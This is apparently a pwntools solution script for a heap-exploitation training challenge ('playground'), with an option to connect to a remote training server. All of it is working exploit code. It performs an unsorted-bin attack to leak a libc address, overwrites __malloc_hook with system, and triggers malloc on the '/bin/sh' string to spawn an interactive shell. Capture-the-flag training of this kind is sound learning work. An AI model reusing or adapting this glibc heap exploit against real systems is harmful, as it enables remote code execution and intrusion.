from pwn import *

CHALL_PATH = "./playground_patch"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("./libc-2.27.so")

COMMANDS="""
b main
brva 0x12B1
c"""


def malloc(r, n):
    r.recvuntil(b'> ')
    m_line = 'malloc ' + str(n)
    r.sendline(m_line.encode())
    r.recvuntil(b'==> ')
    return int(r.recvuntil(b'\n'), 0)

def free(r, p):
    r.recvuntil(b'> ')
    f_line = 'free ' + hex(p)
    r.sendline(f_line.encode())
    r.recvuntil(b'==> ok')

def show(r, p):
    r.recvuntil(b'> ')
    com = 'show ' + hex(p) + ' ' + str(1)
    r.sendline(com.encode())
    d = {}
    for i in range(1):
        pointer = int(r.recvuntil(b':')[:-1], 0)
        content = r.recvuntil(b'\n')
        c = 0
        if len(content) != 1:
            c = int(content, 0)
        d[pointer] = c

    return d

def write(r, p, content):
    r.recvuntil(b'> ')
    w_line = 'write ' + hex(p) + ' ' + str(len(content))
    r.sendline(w_line.encode())
    r.recvuntil(b'==> read\n')
    r.send(content)
    r.recvuntil(b'==> done\n')

if args.GDB:
    r = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REM:
    r = remote("playground.training.offensivedefensive.it", 8080, ssl=True)
else:
    r = process(CHALL_PATH)

r.recvuntil(b'pid: ')
pid = int(r.recvuntil(b'\n'))
r.recvuntil(b'main: ')
main = int(r.recvuntil(b'\n'), 0)

print(f"pid = {pid}\nmain = {hex(main)}")

a = malloc(r, 0x410) #avoid t-cache
b = malloc(r, 500)

free(r, a)
print(hex(a))
max_heap = main + 0x2ec7 # Offset of max_heap from the main
print("max_heap: ", hex(max_heap))

write(r, a + 8, p64(max_heap - 0x10)) # Write to max_heap 

c = malloc(r, 0x410)

libc_leak = show(r, max_heap)[max_heap]

print("Libc leak: ", hex(libc_leak))

malloc_hook_location = libc_leak - 0x70
LIBC.address = malloc_hook_location - 0x3ebc30

bin_sh = next(LIBC.search(b'/bin/sh\0'))

write(r, malloc_hook_location, p64(LIBC.symbols['system']))

r.recvuntil(b'> ')
last = 'malloc ' + str(bin_sh)
r.sendline(last.encode())

r.interactive()